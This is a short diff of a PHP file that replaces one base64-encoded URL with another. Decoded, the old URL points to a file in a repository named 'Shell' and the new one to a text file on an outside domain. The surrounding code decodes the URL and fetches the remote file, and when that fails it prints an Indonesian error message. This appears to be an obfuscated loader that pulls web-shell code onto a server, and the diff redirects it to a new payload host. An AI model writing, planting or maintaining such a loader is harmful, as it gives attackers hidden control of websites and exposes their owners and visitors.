@@ -8,7 +8,7 @@ function decode_file($data) {
 }
 
 
-$encoded_url = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FyZGlmeDAxL1NoZWxsL21haW4vcHJvLnR4dA==";
+$encoded_url = "aHR0cHM6Ly9maWxlLjB4MTk5OS50ZWNoLzEudHh0==";
 
 
 $decoded_url = decode_file($encoded_url);
@@ -36,4 +36,5 @@ if ($file_contents !== false && !empty($file_contents)) {
     echo "File tidak ditemukan atau rusak.";
 }
 ?>
+
 
